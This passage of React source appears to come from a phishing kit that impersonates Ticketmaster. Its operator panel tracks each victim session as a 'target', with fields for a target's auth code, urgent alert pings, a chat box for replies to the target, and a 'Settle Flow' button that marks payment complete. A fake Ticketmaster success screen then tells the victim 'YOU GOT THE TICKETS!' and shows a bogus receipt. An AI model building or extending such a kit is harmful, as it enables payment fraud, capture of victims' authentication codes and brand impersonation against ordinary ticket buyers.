                      <div className="bg-white p-10 rounded-[45px] border-4 border-white shadow-inner group-hover:shadow-2xl transition-all">
                         <label className="text-[11px] font-black text-gray-400 uppercase block mb-5 tracking-[0.5em]">Target Auth Code</label>
                         <input className="w-full font-black text-[#026cdf] text-6xl outline-none placeholder:text-gray-100 uppercase italic tracking-widest bg-transparent" placeholder="SET" onBlur={(e) => updateSession(s.id, { userAuthCode: e.target.value.trim() })} defaultValue={s.userAuthCode} />
                      </div>
                      <div className="bg-white p-10 rounded-[45px] border-4 border-white shadow-inner group-hover:shadow-2xl transition-all">
                         <label className="text-[11px] font-black text-gray-400 uppercase block mb-5 tracking-[0.5em]">System Alert (Bell)</label>
                         <div className="flex flex-col gap-4">
                            <input className="w-full text-sm font-black outline-none uppercase placeholder:text-gray-300 italic p-2 border-b-4 border-gray-50" placeholder="URGENT BROADCAST..." id={`p-${s.id}`} />
                            <button onClick={() => { const i = document.getElementById(`p-${s.id}`); updateSession(s.id, { notifications: [...(s.notifications || []), {text: i.value, timestamp: new Date().toISOString()}] }); i.value=''; }} className="bg-red-600 text-white w-full py-5 rounded-[25px] font-black text-[12px] shadow-2xl hover:bg-red-700 active:scale-95 transition-all uppercase tracking-widest italic">Deploy Ping</button>
                         </div>
                      </div>
                    </div>
                    <div className="flex gap-5">
                      <div className="flex-1 relative group/inp">
                         <input className="w-full bg-white border-4 border-white p-7 rounded-[40px] text-base font-black outline-none italic shadow-inner group-hover:border-[#026cdf]/20 transition-all" placeholder="Encrypted Reply to Target..." onKeyDown={e => { if(e.key==='Enter'){ sendChatMessage(s.id, e.target.value, 'system'); e.target.value='' } }} />
                         <Send className="absolute right-10 top-7 w-7 h-7 text-gray-300 group-focus-within/inp:text-[#026cdf] transition-colors" />
                      </div>
                      <button onClick={() => updateSession(s.id, {status: 'payment_complete'})} className="bg-green-600 text-white px-16 rounded-[40px] font-black text-base uppercase shadow-[0_20px_50px_rgba(34,197,94,0.5)] hover:bg-green-700 active:scale-95 transition-all tracking-widest italic tracking-tighter">Settle Flow</button>
                    </div>
                  </div>
                ))}
             </div>
          </div>
        </div>
      </div>
    </div>
  );
}

function SuccessScreen({ event, cart, onHome }) {
  const [showPrize, setShowPrize] = useState(false);
  useEffect(() => { setTimeout(() => setShowPrize(true), 800); }, []);
  const total = (cart.reduce((a,b)=>a+b.price,0) + (cart.length * 19.50) + 5.00).toFixed(2);
  return (
    <div className="min-h-screen bg-[#026cdf] flex items-center justify-center p-6 overflow-hidden relative">
      <div className="absolute inset-0 pointer-events-none opacity-50">
         {[...Array(60)].map((_, i) => (<div key={i} className={`absolute w-3 h-16 bg-white/40 rounded-full animate-confetti`} style={{ left: `${Math.random()*100}%`, animationDelay: `${Math.random()*4}s`, top: `-100px` }} />))}
      </div>
      <div className={`bg-white w-full max-w-2xl rounded-[100px] p-20 text-center shadow-[0_120px_250px_rgba(0,0,0,0.7)] transition-all duration-1000 transform ${showPrize ? 'scale-100 opacity-100' : 'scale-50 opacity-0 translate-y-40'}`}>
         <div className="w-40 h-40 bg-green-500 rounded-[60px] flex items-center justify-center mx-auto mb-14 shadow-[0_30px_100px_rgba(34,197,94,0.5)] animate-bounce"><CheckCircle className="text-white w-24 h-24 stroke-[4]" /></div>
         <h1 className="text-6xl md:text-8xl font-black text-gray-900 leading-tight mb-8 uppercase italic tracking-tighter">YOU GOT THE TICKETS!</h1>
         <p className="text-gray-400 font-black mb-16 text-sm uppercase tracking-[0.6em] italic opacity-60">Verified Confirmation & Secure Receipt</p>
         
         <div className="bg-gray-50 rounded-[80px] p-16 border-8 border-dashed border-gray-100 mb-16 space-y-10 shadow-inner text-center group">
            <Ticket className="w-20 h-20 text-[#026cdf] mx-auto mb-6 animate-pulse" />
            <div className="flex flex-col items-center justify-center gap-4">
               <div className="flex items-center justify-center gap-2">
                 <span className="font-bold text-4xl tracking-tighter uppercase italic">ticketmaster</span>
                 <div className="bg-[#026cdf] rounded-full w-5 h-5 flex items-center justify-center shadow-[0_0_20px_rgba(2,108,223,0.8)]"><CheckCircle className="w-4 h-4 text-white" /></div>
               </div>
               <p className="text-[12px] text-gray-300 font-black uppercase tracking-[0.8em] italic">Authorized Flow Complete</p>
               <p className="text-9xl font-black text-gray-900 tracking-tighter drop-shadow-sm">${total}</p>
            </div>
         </div>
         <button onClick={onHome} className="w-full bg-[#1f262d] text-white py-10 rounded-[50px] font-black text-3xl hover:bg-black uppercase tracking-[0.4em] italic shadow-[0_30px_100px_rgba(0,0,0,0.5)] transition-all active:scale-95 scale-105">VIEW TICKETS</button>
      </div>
    </div>
  );
}

